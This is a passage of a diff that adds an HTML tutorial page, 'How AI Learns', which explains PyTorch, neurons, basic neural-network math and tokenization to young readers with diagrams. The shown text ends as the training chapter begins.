@@ -1,0 +1,1410 @@
+<!doctype html>
+<html lang="en" class="scroll-smooth">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#0f62fe">
+<title>How AI Learns — A tutorial for curious minds</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Serif:wght@400;500;700&display=swap" rel="stylesheet">
+
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+  tailwind.config = {
+    darkMode: 'class',
+    theme: {
+      extend: {
+        colors: {
+          ibm: {
+            blue: {
+              20: '#d0e2ff', 30: '#a6c8ff', 40: '#78a9ff', 50: '#4589ff',
+              60: '#0f62fe', 70: '#0043ce', 80: '#002d9c', 90: '#001d6c'
+            },
+            gray: {
+              10: '#f4f4f4', 20: '#e0e0e0', 30: '#c6c6c6', 50: '#8d8d8d',
+              60: '#6f6f6f', 70: '#525252', 80: '#393939', 90: '#262626', 100: '#161616'
+            }
+          }
+        },
+        fontFamily: {
+          sans:    ['"IBM Plex Sans"', 'system-ui', 'sans-serif'],
+          serif:   ['"IBM Plex Serif"', 'Georgia', 'serif'],
+          mono:    ['"IBM Plex Mono"', 'ui-monospace', 'monospace'],
+        }
+      }
+    }
+  }
+</script>
+
+<style>
+  html { -webkit-text-size-adjust: 100%; }
+  body { font-feature-settings: "ss01", "cv05"; }
+
+  /* prose styles inside content cards */
+  .prose-tut p   { line-height: 1.7; }
+  .prose-tut h3  { font-weight: 600; }
+  .prose-tut code:not(pre code) {
+    font-family: "IBM Plex Mono", monospace;
+    font-size: 0.9em;
+    background: rgba(15,98,254,0.08);
+    color: #0043ce;
+    padding: 1px 6px;
+    border-radius: 3px;
+  }
+  .dark .prose-tut code:not(pre code) {
+    background: rgba(120,169,255,0.15);
+    color: #a6c8ff;
+  }
+
+  pre {
+    font-family: "IBM Plex Mono", monospace;
+    font-size: 0.875rem;
+    line-height: 1.6;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+  }
+
+  /* svg diagrams */
+  .diagram { width: 100%; height: auto; max-height: 460px; }
+  .diagram text { font-family: "IBM Plex Sans", sans-serif; }
+  .diagram .stroke-fg { stroke: #161616; }
+  .dark .diagram .stroke-fg { stroke: #f4f4f4; }
+  .diagram .fill-fg { fill: #161616; }
+  .dark .diagram .fill-fg { fill: #f4f4f4; }
+  .diagram .fill-card { fill: #ffffff; }
+  .dark .diagram .fill-card { fill: #262626; }
+  .diagram .stroke-blue { stroke: #0f62fe; }
+  .diagram .fill-blue { fill: #0f62fe; }
+  .diagram .fill-blue-soft { fill: rgba(15,98,254,0.15); }
+  .dark .diagram .fill-blue { fill: #78a9ff; }
+  .dark .diagram .stroke-blue { stroke: #78a9ff; }
+  .dark .diagram .fill-blue-soft { fill: rgba(120,169,255,0.20); }
+  .diagram .muted-text { fill: #525252; }
+  .dark .diagram .muted-text { fill: #8d8d8d; }
+
+  /* native dialog as modal */
+  dialog::backdrop { background: rgba(22,22,22,0.55); backdrop-filter: blur(2px); }
+  dialog[open] { animation: pop .2s ease-out; }
+  @keyframes pop { from { opacity:0; transform: scale(.97); } }
+
+  /* progress bar at top */
+  #progress { height: 3px; }
+
+  /* selection */
+  ::selection { background: #0f62fe; color: white; }
+
+  /* focus rings — IBM Carbon style */
+  a:focus-visible, button:focus-visible {
+    outline: 2px solid #0f62fe;
+    outline-offset: 2px;
+  }
+  .dark a:focus-visible, .dark button:focus-visible {
+    outline-color: #78a9ff;
+  }
+
+  /* anchor offset for sticky nav */
+  section[id] { scroll-margin-top: 72px; }
+</style>
+</head>
+
+<body class="bg-white text-ibm-gray-100 dark:bg-ibm-gray-100 dark:text-ibm-gray-10 font-sans transition-colors">
+
+<!-- progress bar -->
+<div id="progress" class="fixed top-0 left-0 z-50 bg-ibm-blue-60 dark:bg-ibm-blue-40 w-0"></div>
+
+<!-- ============================ NAV ============================ -->
+<nav class="sticky top-0 z-40 bg-white/90 dark:bg-ibm-gray-100/90 backdrop-blur border-b border-ibm-gray-20 dark:border-ibm-gray-80">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-3 flex items-center justify-between gap-3">
+    <a href="#top" class="flex items-center gap-2 font-semibold text-sm sm:text-base">
+      <svg width="22" height="22" viewBox="0 0 32 32" class="text-ibm-blue-60 dark:text-ibm-blue-40">
+        <rect x="2" y="2" width="28" height="28" fill="none" stroke="currentColor" stroke-width="2"/>
+        <rect x="8" y="8" width="6" height="6" fill="currentColor"/>
+        <rect x="18" y="8" width="6" height="6" fill="currentColor"/>
+        <rect x="8" y="18" width="16" height="6" fill="currentColor"/>
+      </svg>
+      <span class="hidden sm:inline">How AI Learns</span>
+      <span class="sm:hidden">AI 101</span>
+    </a>
+
+    <div class="hidden lg:flex items-center gap-1 text-sm">
+      <a href="#pytorch"     class="px-2 py-1 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">PyTorch</a>
+      <a href="#thinking"    class="px-2 py-1 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">Models</a>
+      <a href="#tokens"      class="px-2 py-1 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">Tokens</a>
+      <a href="#training"    class="px-2 py-1 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">Training</a>
+      <a href="#ollama"      class="px-2 py-1 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">Ollama</a>
+      <a href="#own-data"    class="px-2 py-1 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">Your data</a>
+      <a href="#refs"        class="px-2 py-1 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">References</a>
+    </div>
+
+    <div class="flex items-center gap-2">
+      <button id="theme-toggle" class="p-2 hover:bg-ibm-gray-10 dark:hover:bg-ibm-gray-90 rounded transition" aria-label="Toggle dark mode">
+        <svg id="icon-sun" class="hidden dark:block w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="4"/>
+          <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/>
+        </svg>
+        <svg id="icon-moon" class="dark:hidden w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+        </svg>
+      </button>
+      <button id="menu-toggle" class="lg:hidden p-2 hover:bg-ibm-gray-10 dark:hover:bg-ibm-gray-90 rounded" aria-label="Menu">
+        <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+  <!-- mobile nav -->
+  <div id="mobile-nav" class="lg:hidden hidden border-t border-ibm-gray-20 dark:border-ibm-gray-80 px-4 py-3 grid grid-cols-2 gap-2 text-sm">
+    <a href="#pytorch"  class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§1 PyTorch</a>
+    <a href="#thinking" class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§2 How models think</a>
+    <a href="#math"     class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§3 The math</a>
+    <a href="#tokens"   class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§4 Tokens</a>
+    <a href="#training" class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§5 Training</a>
+    <a href="#lora"     class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§6 LoRA</a>
+    <a href="#ollama"   class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§7 Ollama / GGUF</a>
+    <a href="#flow"     class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§8 End-to-end</a>
+    <a href="#gen-math" class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§9 Generation math</a>
+    <a href="#own-data" class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§10 Your data</a>
+    <a href="#tools"    class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§11 The toolkit</a>
+    <a href="#refs"     class="py-2 hover:text-ibm-blue-60 dark:hover:text-ibm-blue-40">§12 Keep learning</a>
+  </div>
+</nav>
+
+<!-- ============================ HERO ============================ -->
+<header id="top" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-12 sm:py-20">
+    <div class="inline-flex items-center gap-2 px-3 py-1 bg-ibm-blue-60 text-white text-xs font-mono uppercase tracking-widest mb-6">
+      <span class="w-1.5 h-1.5 bg-white rounded-full animate-pulse"></span>
+      Tutorial · ages 12 +
+    </div>
+    <h1 class="font-serif font-bold tracking-tight leading-[0.95] text-4xl sm:text-6xl lg:text-7xl">
+      How does an AI actually <em class="text-ibm-blue-60 dark:text-ibm-blue-40 not-italic">learn</em> things?
+    </h1>
+    <p class="mt-6 max-w-2xl text-lg sm:text-xl text-ibm-gray-70 dark:text-ibm-gray-30 leading-relaxed">
+      A step-by-step tour of PyTorch, neural networks, training, the secret format Ollama uses, and how your typed question actually turns into an answer. No PhD required — middle-school math is enough.
+    </p>
+    <div class="mt-10 flex flex-wrap gap-3 text-sm">
+      <a href="#pytorch"  class="px-4 py-2.5 bg-ibm-blue-60 hover:bg-ibm-blue-70 text-white font-medium transition">Start reading →</a>
+      <a href="#refs"     class="px-4 py-2.5 border border-ibm-gray-100 dark:border-ibm-gray-10 hover:bg-ibm-gray-100 hover:text-white dark:hover:bg-ibm-gray-10 dark:hover:text-ibm-gray-100 font-medium transition">Jump to references</a>
+    </div>
+    <div class="mt-10 grid grid-cols-2 sm:grid-cols-4 gap-px bg-ibm-gray-20 dark:bg-ibm-gray-80 border border-ibm-gray-20 dark:border-ibm-gray-80">
+      <div class="bg-white dark:bg-ibm-gray-100 p-4">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50">12</div>
+        <div class="text-sm mt-1">chapters</div>
+      </div>
+      <div class="bg-white dark:bg-ibm-gray-100 p-4">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50">~30 min</div>
+        <div class="text-sm mt-1">to read</div>
+      </div>
+      <div class="bg-white dark:bg-ibm-gray-100 p-4">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50">7</div>
+        <div class="text-sm mt-1">diagrams</div>
+      </div>
+      <div class="bg-white dark:bg-ibm-gray-100 p-4">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50">3</div>
+        <div class="text-sm mt-1">dataset templates</div>
+      </div>
+    </div>
+  </div>
+</header>
+
+
+<!-- ====================== §1 PYTORCH ====================== -->
+<section id="pytorch" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="grid lg:grid-cols-12 gap-8">
+      <div class="lg:col-span-4">
+        <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 01</div>
+        <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight">What is PyTorch?</h2>
+      </div>
+      <div class="lg:col-span-8 prose-tut text-lg leading-relaxed space-y-5 max-w-prose">
+        <p>Imagine a really, really fast calculator. Not just one that adds two numbers — one that can multiply millions of numbers at once, AND remember every step it took. That's <strong>PyTorch</strong>. It's a free software library that runs on your computer and powers most of the AI you hear about.</p>
+        <p>PyTorch has two superpowers:</p>
+        <ol class="list-decimal pl-6 space-y-2">
+          <li><strong>Tensors.</strong> A tensor is just a grid of numbers — like a spreadsheet, but it can have more dimensions. A list is a 1-D tensor, a table is a 2-D tensor, a stack of tables is 3-D, and so on. AI models are made of millions of numbers organized into tensors.</li>
+          <li><strong>Autograd.</strong> The "remembering" part. When you do math on tensors, PyTorch secretly writes down every step. Later it can run those steps backwards to figure out how to <em>improve</em> — which is how AIs learn.</li>
+        </ol>
+        <p>You don't have to write PyTorch code to use this project. The trainer container does all of that. But knowing what's happening inside helps everything else make sense.</p>
+
+        <div class="flex flex-wrap gap-3 pt-2">
+          <button data-modal="pytorch-deep" class="inline-flex items-center gap-2 px-3 py-2 text-sm border border-ibm-blue-60 text-ibm-blue-60 dark:text-ibm-blue-40 dark:border-ibm-blue-40 hover:bg-ibm-blue-60 hover:text-white dark:hover:bg-ibm-blue-40 dark:hover:text-ibm-gray-100 transition">
+            <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+            Deeper dive — try real tensor code
+          </button>
+          <a href="https://pytorch.org/tutorials/beginner/basics/intro.html" target="_blank" rel="noopener" class="inline-flex items-center gap-2 px-3 py-2 text-sm text-ibm-blue-60 dark:text-ibm-blue-40 hover:underline">
+            Official PyTorch tutorial ↗
+          </a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ====================== §2 HOW MODELS THINK ====================== -->
+<section id="thinking" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80 bg-ibm-gray-10/50 dark:bg-ibm-gray-90/50">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 02</div>
+    <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight max-w-3xl">How does a model actually "think"?</h2>
+
+    <div class="grid lg:grid-cols-2 gap-10 items-start mt-10">
+      <div class="prose-tut text-lg leading-relaxed space-y-5">
+        <p>A neural network is built from tiny math units called <strong>neurons</strong>. A single neuron does something a 5th grader could do:</p>
+        <ol class="list-decimal pl-6 space-y-2">
+          <li>Take some numbers as input (say, three numbers).</li>
+          <li>Multiply each by a "weight" — a knob that the model gets to tune.</li>
+          <li>Add them all up. Add one more number called a "bias."</li>
+          <li>Run the result through a simple decision function (like: "if it's negative, make it zero").</li>
+          <li>Spit out the result.</li>
+        </ol>
+        <p>That's it. One neuron is dumb. But when you stack thousands of them in layers, and the output of one layer becomes the input of the next, magical things happen — the network learns to recognize cats in photos, translate French, or answer grocery questions.</p>
+        <p>Every "weight" is a number PyTorch stores in a tensor. The famous "135 million parameter model" we use? That's 135 million weights, sitting in tensors, ready to be tuned.</p>
+
+        <button data-modal="neuron-math" class="inline-flex items-center gap-2 px-3 py-2 text-sm border border-ibm-blue-60 text-ibm-blue-60 dark:text-ibm-blue-40 dark:border-ibm-blue-40 hover:bg-ibm-blue-60 hover:text-white dark:hover:bg-ibm-blue-40 dark:hover:text-ibm-gray-100 transition">
+          Deeper dive — the neuron equation
+        </button>
+      </div>
+
+      <!-- neuron diagram -->
+      <div class="bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-6">
+        <svg class="diagram" viewBox="0 0 500 360" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <marker id="a1" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+              <path d="M0,0 L0,6 L9,3 z" class="fill-fg"/>
+            </marker>
+          </defs>
+          <text x="250" y="25" text-anchor="middle" font-size="13" font-weight="600" class="fill-fg">A single neuron</text>
+
+          <!-- inputs -->
+          <g>
+            <circle cx="60" cy="100" r="20" class="fill-blue-soft stroke-blue" stroke-width="2"/>
+            <text x="60" y="105" text-anchor="middle" font-size="14" font-weight="500" class="fill-fg">x₁</text>
+            <text x="60" y="135" text-anchor="middle" font-size="11" class="muted-text">input 1</text>
+
+            <circle cx="60" cy="180" r="20" class="fill-blue-soft stroke-blue" stroke-width="2"/>
+            <text x="60" y="185" text-anchor="middle" font-size="14" font-weight="500" class="fill-fg">x₂</text>
+            <text x="60" y="215" text-anchor="middle" font-size="11" class="muted-text">input 2</text>
+
+            <circle cx="60" cy="260" r="20" class="fill-blue-soft stroke-blue" stroke-width="2"/>
+            <text x="60" y="265" text-anchor="middle" font-size="14" font-weight="500" class="fill-fg">x₃</text>
+            <text x="60" y="295" text-anchor="middle" font-size="11" class="muted-text">input 3</text>
+          </g>
+
+          <!-- arrows with weights -->
+          <line x1="80" y1="100" x2="230" y2="170" class="stroke-fg" stroke-width="1.5" marker-end="url(#a1)"/>
+          <text x="150" y="125" font-size="12" font-family="IBM Plex Mono" class="fill-blue">w₁</text>
+
+          <line x1="80" y1="180" x2="230" y2="180" class="stroke-fg" stroke-width="1.5" marker-end="url(#a1)"/>
+          <text x="150" y="172" font-size="12" font-family="IBM Plex Mono" class="fill-blue">w₂</text>
+
+          <line x1="80" y1="260" x2="230" y2="195" class="stroke-fg" stroke-width="1.5" marker-end="url(#a1)"/>
+          <text x="150" y="245" font-size="12" font-family="IBM Plex Mono" class="fill-blue">w₃</text>
+
+          <!-- summation -->
+          <circle cx="255" cy="180" r="28" class="fill-card stroke-fg" stroke-width="2"/>
+          <text x="255" y="187" text-anchor="middle" font-size="24" font-weight="600" class="fill-fg">Σ</text>
+          <text x="255" y="225" text-anchor="middle" font-size="10" class="muted-text">add them up</text>
+
+          <!-- activation -->
+          <line x1="283" y1="180" x2="335" y2="180" class="stroke-fg" stroke-width="1.5" marker-end="url(#a1)"/>
+          <rect x="340" y="155" width="80" height="50" class="fill-card stroke-fg" stroke-width="2"/>
+          <text x="380" y="180" text-anchor="middle" font-size="13" font-weight="500" class="fill-fg">activation</text>
+          <text x="380" y="195" text-anchor="middle" font-size="10" font-family="IBM Plex Mono" class="fill-blue">ReLU, sigmoid…</text>
+
+          <!-- output -->
+          <line x1="420" y1="180" x2="455" y2="180" class="stroke-fg" stroke-width="1.5" marker-end="url(#a1)"/>
+          <circle cx="475" cy="180" r="16" class="fill-blue"/>
+          <text x="475" y="185" text-anchor="middle" font-size="13" font-weight="600" fill="white">y</text>
+          <text x="475" y="215" text-anchor="middle" font-size="11" class="muted-text">output</text>
+
+          <!-- formula -->
+          <rect x="80" y="320" width="340" height="30" class="fill-blue-soft" rx="3"/>
+          <text x="250" y="340" text-anchor="middle" font-size="13" font-family="IBM Plex Mono" font-weight="500" class="fill-fg">y = activation(w₁·x₁ + w₂·x₂ + w₃·x₃ + b)</text>
+        </svg>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ====================== §3 THE MATH ====================== -->
+<section id="math" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 03</div>
+    <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight max-w-3xl">The math, made simple.</h2>
+    <p class="mt-3 max-w-2xl text-ibm-gray-70 dark:text-ibm-gray-30 text-lg">Three things to know. That's it.</p>
+
+    <div class="mt-10 grid md:grid-cols-3 gap-6">
+
+      <!-- math 1: multiplication -->
+      <div class="bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-6">
+        <div class="font-mono text-xs text-ibm-blue-60 dark:text-ibm-blue-40 mb-2">MATH IDEA #1</div>
+        <h3 class="font-serif font-bold text-2xl mb-3">Multiply &amp; add</h3>
+        <p class="text-ibm-gray-70 dark:text-ibm-gray-30 mb-4">Every layer of a model is mostly just multiplication-and-adding. Lots of it.</p>
+        <pre class="bg-ibm-gray-10 dark:bg-ibm-gray-90 p-3 text-xs"><code>inputs:  [1, 2, 3]
+weights: [4, 5, 6]
+output = 1×4 + 2×5 + 3×6
+       = 4 + 10 + 18
+       = <span class="text-ibm-blue-60 dark:text-ibm-blue-40 font-semibold">32</span></code></pre>
+        <p class="mt-4 text-sm text-ibm-gray-60 dark:text-ibm-gray-50">This is called a "dot product." A neural network does <em>millions</em> of these per second.</p>
+      </div>
+
+      <!-- math 2: activation -->
+      <div class="bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-6">
+        <div class="font-mono text-xs text-ibm-blue-60 dark:text-ibm-blue-40 mb-2">MATH IDEA #2</div>
+        <h3 class="font-serif font-bold text-2xl mb-3">Activation: yes/no/maybe</h3>
+        <p class="text-ibm-gray-70 dark:text-ibm-gray-30 mb-4">After the sum, the result goes through an "activation function" that decides if the neuron speaks up.</p>
+        <svg viewBox="0 0 200 120" class="w-full">
+          <line x1="20" y1="100" x2="180" y2="100" class="stroke-fg" stroke-width="1"/>
+          <line x1="100" y1="20" x2="100" y2="110" class="stroke-fg" stroke-width="1"/>
+          <path d="M 20 100 L 100 100 L 180 30" class="stroke-blue" stroke-width="2.5" fill="none"/>
+          <text x="190" y="105" font-size="10" class="muted-text">x</text>
+          <text x="105" y="20" font-size="10" class="muted-text">y</text>
+          <text x="100" y="125" text-anchor="middle" font-size="11" font-family="IBM Plex Mono" class="fill-blue">y = max(0, x)</text>
+        </svg>
+        <p class="mt-3 text-sm text-ibm-gray-60 dark:text-ibm-gray-50">This one is called ReLU. If <code>x</code> is negative, output 0. If positive, pass it through. Simple, but it's the workhorse of modern AI.</p>
+      </div>
+
+      <!-- math 3: gradient descent -->
+      <div class="bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-6">
+        <div class="font-mono text-xs text-ibm-blue-60 dark:text-ibm-blue-40 mb-2">MATH IDEA #3</div>
+        <h3 class="font-serif font-bold text-2xl mb-3">Roll downhill</h3>
+        <p class="text-ibm-gray-70 dark:text-ibm-gray-30 mb-4">Training is just: <em>which way should I tweak the knobs to make the answer better?</em></p>
+        <svg viewBox="0 0 200 120" class="w-full">
+          <path d="M 20 30 Q 100 130, 180 30" class="stroke-blue" stroke-width="2.5" fill="none"/>
+          <circle cx="35" cy="55" r="5" class="fill-blue"/>
+          <path d="M 40 60 L 70 78" class="stroke-fg" stroke-width="1.5" stroke-dasharray="3 3"/>
+          <circle cx="75" cy="83" r="5" class="fill-blue" opacity="0.6"/>
+          <path d="M 80 87 L 105 95" class="stroke-fg" stroke-width="1.5" stroke-dasharray="3 3"/>
+          <circle cx="110" cy="95" r="5" class="fill-blue" opacity="0.4"/>
+          <text x="100" y="118" text-anchor="middle" font-size="11" class="muted-text">"loss" goes down with each step</text>
+        </svg>
+        <p class="mt-3 text-sm text-ibm-gray-60 dark:text-ibm-gray-50">PyTorch's autograd computes the slope automatically. The optimizer takes one small step downhill. Repeat thousands of times → the model learns.</p>
+      </div>
+    </div>
+
+    <div class="mt-8">
+      <button data-modal="math-deep" class="inline-flex items-center gap-2 px-3 py-2 text-sm border border-ibm-blue-60 text-ibm-blue-60 dark:text-ibm-blue-40 dark:border-ibm-blue-40 hover:bg-ibm-blue-60 hover:text-white dark:hover:bg-ibm-blue-40 dark:hover:text-ibm-gray-100 transition">
+        Deeper dive — matrices, softmax, gradient descent in detail
+      </button>
+    </div>
+  </div>
+</section>
+
+
+<!-- ====================== §4 TOKENS ====================== -->
+<section id="tokens" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80 bg-ibm-gray-10/50 dark:bg-ibm-gray-90/50">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 04</div>
+    <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight max-w-3xl">Words → numbers: meet the tokenizer.</h2>
+
+    <div class="mt-10 grid lg:grid-cols-12 gap-10">
+      <div class="lg:col-span-5 prose-tut text-lg leading-relaxed space-y-5">
+        <p>Models can't read English. They can only do math. So before any text reaches the model, a piece of code called the <strong>tokenizer</strong> chops it into pieces and replaces each piece with a number.</p>
+        <p>The pieces aren't always whole words. Common words get one number; rare words get split. <code>"unbelievable"</code> might split into <code>"un"</code> + <code>"believ"</code> + <code>"able"</code> — three tokens. Each token has an ID from a fixed "vocabulary" (usually around 32,000 – 200,000 entries).</p>
+        <p>This is also why we say things like "this model has a 2,048 token context" — that's how many tokens it can pay attention to at once.</p>
+
+        <button data-modal="tokenizer-deep" class="inline-flex items-center gap-2 px-3 py-2 text-sm border border-ibm-blue-60 text-ibm-blue-60 dark:text-ibm-blue-40 dark:border-ibm-blue-40 hover:bg-ibm-blue-60 hover:text-white dark:hover:bg-ibm-blue-40 dark:hover:text-ibm-gray-100 transition mt-4">
+          Deeper dive — Byte Pair Encoding
+        </button>
+      </div>
+
+      <div class="lg:col-span-7">
+        <div class="bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-6">
+          <svg class="diagram" viewBox="0 0 580 280" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <marker id="a2" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+                <path d="M0,0 L0,6 L9,3 z" class="fill-fg"/>
+              </marker>
+            </defs>
+            <!-- input text -->
+            <rect x="20" y="30" width="170" height="40" class="fill-blue-soft" rx="3"/>
+            <text x="105" y="55" text-anchor="middle" font-size="14" font-family="IBM Plex Mono" class="fill-fg">"How do I store herbs?"</text>
+            <text x="105" y="20" text-anchor="middle" font-size="11" class="muted-text">your message</text>
+
+            <!-- arrow -->
+            <line x1="195" y1="50" x2="225" y2="50" class="stroke-fg" stroke-width="1.5" marker-end="url(#a2)"/>
+
+            <!-- tokenizer box -->
+            <rect x="230" y="25" width="120" height="50" class="fill-card stroke-fg" stroke-width="2"/>
+            <text x="290" y="48" text-anchor="middle" font-size="13" font-weight="500" class="fill-fg">tokenizer</text>
+            <text x="290" y="65" text-anchor="middle" font-size="10" font-family="IBM Plex Mono" class="muted-text">BPE</text>
+
+            <!-- arrow -->
+            <line x1="355" y1="50" x2="385" y2="50" class="stroke-fg" stroke-width="1.5" marker-end="url(#a2)"/>
+
+            <!-- tokens -->
+            <text x="480" y="20" text-anchor="middle" font-size="11" class="muted-text">tokens</text>
+            <g font-family="IBM Plex Mono" font-size="11">
+              <rect x="390" y="30" width="40" height="22" class="fill-blue-soft" rx="2"/><text x="410" y="46" text-anchor="middle" class="fill-fg">How</text>
+              <rect x="435" y="30" width="35" height="22" class="fill-blue-soft" rx="2"/><text x="452" y="46" text-anchor="middle" class="fill-fg"> do</text>
+              <rect x="475" y="30" width="25" height="22" class="fill-blue-soft" rx="2"/><text x="487" y="46" text-anchor="middle" class="fill-fg"> I</text>
+              <rect x="505" y="30" width="55" height="22" class="fill-blue-soft" rx="2"/><text x="532" y="46" text-anchor="middle" class="fill-fg"> store</text>
+              <rect x="390" y="56" width="45" height="22" class="fill-blue-soft" rx="2"/><text x="412" y="72" text-anchor="middle" class="fill-fg"> herbs</text>
+              <rect x="440" y="56" width="20" height="22" class="fill-blue-soft" rx="2"/><text x="450" y="72" text-anchor="middle" class="fill-fg">?</text>
+            </g>
+
+            <!-- arrow down -->
+            <line x1="475" y1="90" x2="475" y2="120" class="stroke-fg" stroke-width="1.5" marker-end="url(#a2)"/>
+
+            <!-- token IDs -->
+            <text x="480" y="115" text-anchor="middle" font-size="11" class="muted-text">token IDs (numbers)</text>
+            <g font-family="IBM Plex Mono" font-size="12">
+              <rect x="390" y="125" width="42" height="22" class="fill-blue" rx="2"/><text x="411" y="141" text-anchor="middle" fill="white">2437</text>
+              <rect x="437" y="125" width="42" height="22" class="fill-blue" rx="2"/><text x="458" y="141" text-anchor="middle" fill="white">466</text>
+              <rect x="484" y="125" width="42" height="22" class="fill-blue" rx="2"/><text x="505" y="141" text-anchor="middle" fill="white">358</text>
+              <rect x="531" y="125" width="42" height="22" class="fill-blue" rx="2"/><text x="552" y="141" text-anchor="middle" fill="white">3637</text>
+              <rect x="390" y="150" width="42" height="22" class="fill-blue" rx="2"/><text x="411" y="166" text-anchor="middle" fill="white">28435</text>
+              <rect x="437" y="150" width="42" height="22" class="fill-blue" rx="2"/><text x="458" y="166" text-anchor="middle" fill="white">30</text>
+            </g>
+
+            <!-- arrow into model -->
+            <line x1="475" y1="180" x2="475" y2="210" class="stroke-fg" stroke-width="1.5" marker-end="url(#a2)"/>
+            <rect x="380" y="215" width="200" height="40" class="fill-blue" rx="3"/>
+            <text x="480" y="240" text-anchor="middle" font-size="13" font-weight="600" fill="white">→ into the model</text>
+
+            <!-- vocab info -->
+            <g transform="translate(20, 120)">
+              <rect x="0" y="0" width="320" height="135" class="fill-card stroke-fg" stroke-width="1" stroke-dasharray="3,3" rx="3"/>
+              <text x="10" y="20" font-size="11" font-family="IBM Plex Mono" class="muted-text">A peek at the vocabulary:</text>
+              <text x="10" y="42" font-size="12" font-family="IBM Plex Mono" class="fill-fg">  2437 →  "How"</text>
+              <text x="10" y="60" font-size="12" font-family="IBM Plex Mono" class="fill-fg">   466 →  " do"</text>
+              <text x="10" y="78" font-size="12" font-family="IBM Plex Mono" class="fill-fg">   358 →  " I"</text>
+              <text x="10" y="96" font-size="12" font-family="IBM Plex Mono" class="fill-fg">  3637 →  " store"</text>
+              <text x="10" y="114" font-size="12" font-family="IBM Plex Mono" class="fill-fg"> 28435 →  " herbs"</text>
+              <text x="180" y="42" font-size="10" class="muted-text">(token IDs shown</text>
+              <text x="180" y="56" font-size="10" class="muted-text">are illustrative)</text>
+            </g>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ====================== §5 TRAINING LOOP ====================== -->
+<section id="training" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80">
